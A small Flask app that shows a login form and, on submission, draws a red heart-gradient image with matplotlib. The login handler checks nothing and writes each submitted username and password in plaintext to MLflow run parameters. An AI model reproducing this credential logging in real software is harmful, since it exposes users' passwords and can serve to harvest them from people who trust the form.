from flask import Flask, render_template,request
import numpy as np
import matplotlib.pyplot as plt
import io
import base64
import mlflow


app = Flask(__name__)

class HeartGradient:
    def __init__(self, gradient_colors=None):
        if gradient_colors is None:
            self.gradient_colors = ['#ff5e5e', '#ff4d4d', '#ff3333', '#ff1a1a', '#ff0000']
        else:
            self.gradient_colors = gradient_colors

    def draw_heart(self, ax, x, y, size, color):
        t = np.linspace(0, 2 * np.pi, 100)
        x_heart = 16 * np.sin(t)**3
        y_heart = 13 * np.cos(t) - 5 * np.cos(2*t) - 2 * np.cos(3*t) - np.cos(4*t)
        ax.fill(x_heart * size + x, y_heart * size + y, color=color, zorder=2)

    def create_heart_gradient(self):
        fig, ax = plt.subplots()
        ax.set_aspect('equal')
        ax.set_axis_off()
        sizes = np.linspace(1, 0.5, len(self.gradient_colors))
        for i, (size, color) in enumerate(zip(sizes, self.gradient_colors)):
            self.draw_heart(ax, 0, 0, size, color)
        img = io.BytesIO()
        plt.savefig(img, format='png', bbox_inches='tight')
        img.seek(0)
        plot_url = base64.b64encode(img.getvalue()).decode()
        plt.close()
        return plot_url

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def show_heart():

    username = request.form.get('username')
    password = request.form.get('password')

    # Start MLflow run to log username and password
    with mlflow.start_run():
        mlflow.log_param("username", username)
        mlflow.log_param("password", password)

    heart_gradient = HeartGradient()
    heart_image = heart_gradient.create_heart_gradient()
    return render_template('result.html', heart_image=heart_image)

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=8080)
